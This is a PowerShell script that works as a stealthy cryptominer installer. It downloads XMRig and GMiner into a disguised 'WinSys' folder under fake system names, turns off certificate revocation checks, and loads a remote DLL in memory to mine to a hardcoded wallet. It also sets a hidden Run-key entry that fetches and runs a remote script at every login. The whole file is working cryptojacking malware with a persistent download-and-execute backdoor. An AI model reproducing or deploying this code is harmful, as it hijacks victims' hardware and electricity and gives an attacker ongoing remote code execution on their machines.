$GithubUser = "HolyV200"
$RepoName = "btcminer-"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll?v=$([Guid]::NewGuid().ToString())"
$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"

$StealthDir = "$env:LOCALAPPDATA\WinSys"

Write-Host "Connecting to network..." -ForegroundColor Cyan
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::CheckCertificateRevocationList = $false

function Get-StealthFile($Url, $Path) {
    if (Test-Path $Path) { Remove-Item $Path -Force -ErrorAction SilentlyContinue }
    try {
        Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -ErrorAction Stop
        if (Test-Path $Path -and (Get-Item $Path).Length -gt 100) { return $true }
    } catch { }
    try {
        if (Get-Command "curl.exe" -ErrorAction SilentlyContinue) {
            curl.exe -L -k --ssl-no-revoke -o $Path $Url
            if (Test-Path $Path -and (Get-Item $Path).Length -gt 100) { return $true }
        }
    } catch { }
    return $false
}

# Cleanup and Prep
try {
    if (-not (Test-Path $StealthDir)) {
        New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
    } else {
        Get-Process | Where-Object { $_.Name -match "WinSystem" -or $_.Path -like "*WinSys*" } | Stop-Process -Force -ErrorAction SilentlyContinue
    }
} catch { }

$CpuZip = Join-Path $StealthDir "upd_c.zip"
$GpuZip = Join-Path $StealthDir "upd_g.zip"
$CpuExe = Join-Path $StealthDir "WinSystem_x.exe"
$GpuExe = Join-Path $StealthDir "WinSystem_g.exe"

# Deploy CPU
if (-not (Test-Path $CpuExe)) {
    Write-Host "Installing CPU Engine..." -ForegroundColor Gray
    if (Get-StealthFile $MinerUrl $CpuZip) {
        Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force
        Remove-Item $CpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
    }
}

# Deploy GPU
$GpuDetected = $null
try {
    $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    if ($vc) {
        $GpuDetected = $vc | Where-Object { $_.Name -match "NVIDIA" -or $_.Name -match "AMD" -or $_.Name -match "Radeon" -or $_.PNPDeviceID -match "VEN_10DE" -or $_.PNPDeviceID -match "VEN_1002" }
    }
} catch { }

if ($GpuDetected -and -not (Test-Path $GpuExe)) {
    Write-Host "Installing GPU Engine..." -ForegroundColor Gray
    if (Get-StealthFile $GpuMinerUrl $GpuZip) {
        Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
        Remove-Item $GpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
        if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
    }
}

# Finalize
Write-Host "Syncing Manager..." -ForegroundColor Gray
$DllPath = Join-Path $StealthDir "Bridge.dll"
if (Get-StealthFile $DllUrl $DllPath) {
    try {
        $dllBytes = [System.IO.File]::ReadAllBytes($DllPath)
        
        # Verify it's actually a DLL and not a 404 page
        if ($dllBytes[0] -ne 0x4D -or $dllBytes[1] -ne 0x5A) {
            throw "Downloaded file is not a valid DLL (Check your GitHub link!)"
        }

        $assembly = [System.Reflection.Assembly]::Load($dllBytes)
        $loader = $assembly.GetType("DateFundLoader")
        $startMethod = $loader.GetMethod("StartMiner")
        $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
        
        # HKCU Run Registry key (Survival)
        $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $Name = "WinSys"
        $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"[Net.ServicePointManager]::CheckCertificateRevocationList = `$false; iwr -useb 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
        Set-ItemProperty -Path $RegPath -Name $Name -Value $Value | Out-Null
        
        Write-Host "`nWorker ON" -ForegroundColor Green
        $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet))
    } catch {
        Write-Host "`nCRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "`nFAILED to download Bridge.dll" -ForegroundColor Red
}
